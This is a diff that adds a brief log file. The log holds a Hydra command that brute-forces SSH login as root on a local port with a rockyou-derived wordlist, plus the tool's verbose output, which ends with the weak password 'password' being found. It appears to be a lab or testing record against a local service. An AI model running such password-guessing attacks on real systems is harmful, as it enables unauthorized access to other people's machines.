@@ -1,0 +1,27 @@
+#
+# COMMAND
+#
+
+hydra -l root -P small_rockyou.txt ssh://127.0.0.1:2223 -t 4 -vV 
+
+#
+# OUTPUT
+#
+
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-17 22:42:52
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 10000 login tries (l:1/p:10000), ~2500 tries per task
+[DATA] attacking ssh://127.0.0.1:2223/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://root@127.0.0.1:2223
+[INFO] Successful, password authentication is supported by ssh://127.0.0.1:2223
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "123456" - 1 of 10000 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "12345" - 2 of 10000 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "123456789" - 3 of 10000 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "password" - 4 of 10000 [child 3] (0/0)
+[2223][ssh] host: 127.0.0.1   login: root   password: password
+[STATUS] attack finished for 127.0.0.1 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-17 22:42:58
+
